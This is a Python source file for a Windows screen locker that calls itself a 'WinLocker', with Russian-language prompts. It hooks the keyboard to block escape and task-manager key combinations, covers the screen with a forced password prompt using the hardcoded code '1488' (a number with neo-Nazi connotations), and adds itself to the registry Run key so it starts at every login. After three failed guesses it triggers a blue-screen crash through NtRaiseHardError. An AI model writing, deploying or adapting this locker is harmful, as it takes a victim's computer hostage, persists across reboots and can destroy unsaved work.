import tkinter as tk
import ctypes
from ctypes import wintypes, c_bool, c_ulong, byref
import sys
import os
import winsound
import threading
import winreg

# ---------- ПАРОЛЬ ----------
PASSWORD = "1488"
ATTEMPTS_LEFT = 3

# ---------- БЛОКИРОВКА КЛАВИАТУРЫ ----------
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_TAB = 0x09
VK_D = 0x44
VK_R = 0x52
VK_ESCAPE = 0x1B
VK_F4 = 0x73
VK_LMENU = 0xA4
VK_RMENU = 0xA5
VK_CONTROL = 0x11
VK_SHIFT = 0x10
VK_DELETE = 0x2E

blocked_combos = [
    frozenset([VK_LWIN, VK_D]),
    frozenset([VK_RWIN, VK_D]),
    frozenset([VK_LWIN, VK_TAB]),
    frozenset([VK_RWIN, VK_TAB]),
    frozenset([VK_LWIN, VK_R]),
    frozenset([VK_RWIN, VK_R]),
    frozenset([VK_LMENU, VK_TAB]),
    frozenset([VK_RMENU, VK_TAB]),
    frozenset([VK_LMENU, VK_F4]),
    frozenset([VK_RMENU, VK_F4]),
    frozenset([VK_CONTROL, VK_SHIFT, VK_ESCAPE]),
    frozenset([VK_CONTROL, VK_LMENU, VK_DELETE]),
    frozenset([VK_CONTROL, VK_RMENU, VK_DELETE]),
]

pressed_keys = set()

def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode == 0:
        kb = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents
        vk_code = ctypes.cast(kb, ctypes.POINTER(ctypes.c_ulong)).contents.value
        if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            pressed_keys.add(vk_code)
            for combo in blocked_combos:
                if combo.issubset(pressed_keys):
                    return 1
            if vk_code in (VK_LWIN, VK_RWIN) and len(pressed_keys) == 1:
                return 1
            if vk_code == VK_LMENU and len(pressed_keys) == 1:
                return 1
        elif wParam == 0x0101:  # WM_KEYUP
            pressed_keys.discard(vk_code)
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
hook_proc = HOOKPROC(low_level_keyboard_proc)

def install_hook():
    hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, kernel32.GetModuleHandleW(None), 0)
    if not hook:
        return False
    msg = wintypes.MSG()
    while user32.GetMessageW(byref(msg), None, 0, 0) != 0:
        user32.TranslateMessage(byref(msg))
        user32.DispatchMessageW(byref(msg))
    user32.UnhookWindowsHookEx(hook)
    return True

# ---------- ГЛАВНОЕ ОКНО ----------
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Lock")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        self.root.configure(bg='black')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind('<Alt-Key-F4>', lambda e: 'break')
        self.root.bind('<Alt-Key-Tab>', lambda e: 'break')
        self.root.bind('<Key-Escape>', lambda e: 'break')

        self.attempts_var = tk.StringVar()
        self.update_attempts_text()

        tk.Label(self.root, text="ВЫ ПОПАЛИ НА ВИНЛОК. УГАДАЙТЕ ПАРОЛЬ У ВАС 3 ПОПЫТКИ",
                 fg='green', bg='black', font=("Courier", 24, "bold")).pack(pady=30)
        tk.Label(self.root, text="(четырёхзначный пароль)", fg='green', bg='black',
                 font=("Courier", 14)).pack(pady=5)

        self.pwd_entry = tk.Entry(self.root, show='*', font=("Courier", 18), justify='center',
                                  fg='green', bg='black', insertbackground='green')
        self.pwd_entry.pack(pady=10)
        self.pwd_entry.focus_set()
        self.pwd_entry.bind('<Return>', self.check_password)

        tk.Label(self.root, textvariable=self.attempts_var, fg='green', bg='black',
                 font=("Courier", 16)).pack(pady=10)

        keypad_frame = tk.Frame(self.root, bg='black')
        keypad_frame.pack(pady=20)
        buttons = [["1","2","3"],["4","5","6"],["7","8","9"],["","0",""]]
        for row in buttons:
            line = tk.Frame(keypad_frame, bg='black')
            line.pack()
            for b in row:
                tk.Label(line, text=b if b else "   ", bg='black', fg='green',
                         font=("Courier", 20, "bold")).pack(side='left', padx=10)

        self.root.after(100, self.keep_on_top)

    def keep_on_top(self):
        self.root.attributes('-topmost', True)
        self.root.lift()
        self.root.after(1000, self.keep_on_top)

    def update_attempts_text(self):
        self.attempts_var.set(f"ОСТАЛОСЬ {ATTEMPTS_LEFT} ПОПЫТКИ")

    def check_password(self, event=None):
        global ATTEMPTS_LEFT
        if self.pwd_entry.get().strip() == PASSWORD:
            self.root.destroy()
        else:
            ATTEMPTS_LEFT -= 1
            self.pwd_entry.delete(0, 'end')
            if ATTEMPTS_LEFT <= 0:
                self.trigger_failure()
            else:
                self.update_attempts_text()

    def trigger_failure(self):
        self.pwd_entry.config(state='disabled')
        self.update_attempts_text()
        threading.Thread(target=self.play_scream, daemon=True).start()
        self.flash_and_die()

    def play_scream(self):
        # Громкий системный звук (критическая ошибка)
        winsound.PlaySound("SystemHand", winsound.SND_ALIAS)

    def flash_and_die(self):
        colors = ['red', 'white']
        self.flash_count = 0
        def flash():
            if self.flash_count < 10:
                self.root.configure(bg=colors[self.flash_count % 2])
                self.flash_count += 1
                self.root.after(100, flash)
            else:
                self.root.after(500, self.trigger_bsod)
        flash()

    def trigger_bsod(self):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, byref(c_ulong()))

def add_to_startup():
    script_path = os.path.abspath(sys.argv[0])
    key = winreg.HKEY_CURRENT_USER
    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "WinLocker", 0, winreg.REG_SZ,
                              f'pythonw.exe "{script_path}"')
        return True
    except:
        return False

if __name__ == "__main__":
    add_to_startup()
    threading.Thread(target=install_hook, daemon=True).start()
    locker = WinLocker()
    locker.root.mainloop()
